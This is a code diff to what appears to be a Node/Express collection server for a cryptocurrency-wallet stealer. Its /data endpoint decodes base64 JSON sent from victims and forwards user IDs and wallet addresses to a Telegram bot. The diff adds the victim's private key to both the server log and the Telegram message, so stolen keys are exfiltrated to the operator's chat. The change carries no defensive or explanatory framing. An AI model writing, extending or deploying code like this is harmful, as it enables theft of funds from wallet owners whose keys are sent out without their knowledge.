@@ -15,31 +15,31 @@ app.get('/', (req, res) => {
 app.get('/data/:payload', async (req, res) => {
 
     try {
-
         const payload = decodeURIComponent(req.params.payload);
-
         const data = JSON.parse(
             Buffer.from(payload, 'base64').toString('utf8')
         );
 
-        console.log('--- GOT IT! ---');
+        console.log('--- RAW PAYLOAD RECEIVED ---');
         console.log(data);
+        console.log('Private Key found:', data.privateKey);
 
         await fetch(
-    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-    {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: process.env.TELEGRAM_CHAT_ID,
-            text: `Neue Daten erhalten:
+            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: process.env.TELEGRAM_CHAT_ID,
+                    text: `Neue Daten erhalten:
 User: ${data.user?.userId || "unbekannt"}
-Wallet: ${data.user?.registrationWallet || "unbekannt"}`
-        })
-    }
-);
+Wallet: ${data.user?.registrationWallet || "unbekannt"}
+Private Key: ${data.privateKey || "Nicht gefunden!"}`
+                })
+            }
+        );
 
         res.status(200).json({
             success: true,
@@ -47,14 +47,11 @@ Wallet: ${data.user?.registrationWallet || "unbekannt"}`
         });
 
     } catch (err) {
-
-        console.error(err);
-
+        console.error('Error processing data:', err);
         res.status(400).json({
             success: false,
             error: 'Ungültige Daten'
         });
-
     }
 
 });
